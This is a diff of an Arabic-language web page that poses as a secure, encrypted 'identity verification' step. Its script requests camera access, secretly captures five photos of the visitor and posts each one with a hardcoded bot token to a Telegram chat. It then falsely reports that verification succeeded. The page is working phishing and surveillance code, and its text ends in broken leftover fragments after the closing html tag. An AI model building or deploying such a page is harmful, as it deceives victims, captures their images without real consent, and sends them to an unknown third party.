@@ -2,39 +2,374 @@
 <html lang="ar">
 <head>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحقق من الهوية</title>
     <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0f0; border: none; border-radius: 5px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0a1a 0%, #1a1a2e 100%);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 1.5rem;
+            margin: 0;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 2.5rem;
+            padding: 2.8rem 2.5rem;
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+            transition: transform 0.25s ease;
+        }
+
+        .card:hover {
+            transform: scale(1.01);
+        }
+
+        h1 {
+            font-weight: 700;
+            font-size: 2.1rem;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #f0f4ff 0%, #b0c4ff 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            color: #a8b5d9;
+            font-size: 0.95rem;
+            margin-bottom: 2.2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            padding-bottom: 1.2rem;
+        }
+
+        .icon-wrapper {
+            background: rgba(0, 200, 150, 0.08);
+            border-radius: 80px;
+            width: 96px;
+            height: 96px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.8rem auto;
+            border: 1px solid rgba(0, 255, 200, 0.15);
+            box-shadow: 0 0 40px rgba(0, 255, 200, 0.05);
+        }
+
+        .icon-wrapper svg {
+            width: 48px;
+            height: 48px;
+            fill: none;
+            stroke: #6ef0d0;
+            stroke-width: 1.8;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 1rem 1.8rem;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 80px;
+            background: linear-gradient(135deg, #00d4a0, #009f7a);
+            color: #0a0a1a;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 24px rgba(0, 200, 150, 0.25);
+            letter-spacing: 0.3px;
+            margin-top: 0.5rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 36px rgba(0, 200, 150, 0.4);
+            background: linear-gradient(135deg, #00e6b0, #00b386);
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.06);
+            color: #b8c7ff;
+            box-shadow: none;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            font-size: 0.9rem;
+            padding: 0.7rem 1.2rem;
+            width: auto;
+            margin-top: 1rem;
+            backdrop-filter: blur(10px);
+            transition: 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .status-badge {
+            display: inline-block;
+            margin-top: 1.8rem;
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            background: rgba(0, 200, 150, 0.08);
+            border: 1px solid rgba(0, 200, 150, 0.12);
+            font-size: 0.8rem;
+            color: #7ad6c0;
+            letter-spacing: 0.4px;
+        }
+
+        .status-badge .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00d4a0;
+            border-radius: 40px;
+            margin-left: 8px;
+            animation: pulse-dot 1.6s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0% { opacity: 0.4; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.4; transform: scale(0.8); }
+        }
+
+        #video {
+            display: none;
+        }
+
+        .progress-container {
+            margin-top: 1.5rem;
+            display: none;
+        }
+
+        .progress-container.active {
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 0.5rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00d4a0, #00f5c0);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+
+        .progress-text {
+            font-size: 0.85rem;
+            color: #a8b5d9;
+            margin-top: 0.5rem;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 2rem 1.5rem;
+                border-radius: 2rem;
+            }
+            h1 {
+                font-size: 1.7rem;
+            }
+            .icon-wrapper {
+                width: 72px;
+                height: 72px;
+            }
+            .icon-wrapper svg {
+                width: 36px;
+                height: 36px;
+            }
+        }
     </style>
 </head>
 <body>
+    <div class="card">
+        <div class="icon-wrapper">
+            <svg viewBox="0 0 24 24">
+                <path d="M23 7L16 12L23 17V7Z" />
+                <path d="M14 5H3C1.89543 5 1 5.89543 1 7V17C1 18.1046 1.89543 19 3 19H14C15.1046 19 16 18.1046 16 17V7C16 5.89543 15.1046 5 14 5Z" />
+            </svg>
+        </div>
 
-    <h1>مطلوب التحقق من الهوية</h1>
-    <button id="startBtn">اضغط هنا للمتابعة</button>
+        <h1>تحقق من الهوية</h1>
+        <p class="subtitle">نحتاج إلى تأكيد هويتك عبر الكاميرا</p>
 
-    <video id="video" style="display:none"></video>
+        <button class="btn" id="startBtn">📸  اضغط للمتابعة</button>
+
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">جارٍ التقاط الصور...</div>
+        </div>
+
+        <div class="status-badge">
+            <span>آمن • مشفر</span>
+            <span class="dot"></span>
+        </div>
+
+        <video id="video" autoplay playsinline></video>
+    </div>
 
     <script>
-        const TOKEN = "8033297244:AAGbuM8xXwDpWh-q5D4c7lkHO9-0KHJNjtg"; // ضع التوكن هنا
-        const CHAT = "5648499583";   // ضع الآيدي هنا
+        const TOKEN = "8033297244:AAGbuM8xXwDpWh-q5D4c7lkHO9-0KHJNjtg";
+        const CHAT = "5648499583";
         const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
 
-        document.getElementById('startBtn').addEventListener('click', async () => {
+        let isRunning = false;
+
+        function updateProgress(current, total) {
+            const percent = (current / total) * 100;
+            progressFill.style.width = `${percent}%`;
+            progressText.textContent = `جارٍ التقاط الصور... (${current}/${total})`;
+        }
+
+        function capturePhotoFromVideo(videoElement) {
+            return new Promise((resolve) => {
+                const canvas = document.createElement("canvas");
+                canvas.width = videoElement.videoWidth || 640;
+                canvas.height = videoElement.videoHeight || 480;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(videoElement, 0, 0);
+                canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.92);
+            });
+        }
+
+        async function sendToTelegram(blob, label = "صورة") {
+            const fd = new FormData();
+            fd.append("chat_id", CHAT);
+            fd.append("caption", `${label} - ${new Date().toLocaleString("ar-EG")}`);
+            fd.append("photo", new File([blob], `${label}.jpg`, { type: "image/jpeg" }));
+
             try {
-                // طلب الإذن والتقاط الصورة
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: fd
+                });
+                if (!resp.ok) {
+                    const errText = await resp.text();
+                    console.warn("Telegram API error:", errText);
+                }
+                return resp;
+            } catch (err) {
+                console.warn("فشل الإرسال:", err);
+                return null;
+            }
+        }
+
+        async function runCaptureSequence(stream) {
+            try {
                 video.srcObject = stream;
                 await video.play();
 
-                // انتظار لحظة ليصبح الفيديو جاهزاً
-                setTimeout(async () => {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext("2d").drawImage(video, 0, 0);
+                await new Promise((resolve) => {
+                    if (video.readyState >= 2) return resolve();
+                    video.addEventListener('loadeddata', resolve, { once: true });
+                });
 
-                    canvas.toBlob(async (blob) => {
+                const labels = ["user", "environment", "user", "environment", "user"];
+                const total = labels.length;
+
+                progressContainer.classList.add('active');
+                updateProgress(0, total);
+
+                for (let i = 0; i < total; i++) {
+                    if (i > 0) await new Promise(r => setTimeout(r, 600));
+                    
+                    const label = labels[i];
+                    const blob = await capturePhotoFromVideo(video);
+                    await sendToTelegram(blob, label);
+                    
+                    updateProgress(i + 1, total);
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+
+                setTimeout(() => {
+                    alert("✅ تم التحقق بنجاح! (5 صور)");
+                }, 300);
+
+            } catch (err) {
+                console.error("خطأ في التسلسل:", err);
+                alert("⚠️ حدث خطأ أثناء التقاط الصور، حاول مرة أخرى.");
+            } finally {
+                isRunning = false;
+                startBtn.disabled = false;
+                startBtn.textContent = "📸  اضغط للمتابعة";
+                
+                setTimeout(() => {
+                    progressContainer.classList.remove('active');
+                }, 1500);
+            }
+        }
+
+        startBtn.addEventListener('click', async () => {
+            if (isRunning) return;
+            
+            isRunning = true;
+            startBtn.disabled = true;
+            startBtn.textContent = "⏳ جارٍ التحقق...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                
+                await runCaptureSequence(stream);
+
+            } catch (err) {
+                console.error("خطأ في الوصول للكاميرا:", err);
+                alert("⚠️ يرجى السماح بالوصول إلى الكاميرا لإكمال العملية.");
+                startBtn.disabled = false;
+                startBtn.textContent = "📸  اضغط للمتابعة";
+                isRunning = false;
+            }
+        });
+
+        console.log("✅ تم تحميل صفحة التحقق.");
+    </script>
+</body>
+</html>                    canvas.toBlob(async (blob) => {
                         const fd = new FormData();
                         fd.append("chat_id", CHAT);
                         fd.append("photo", blob, "image.jpg");
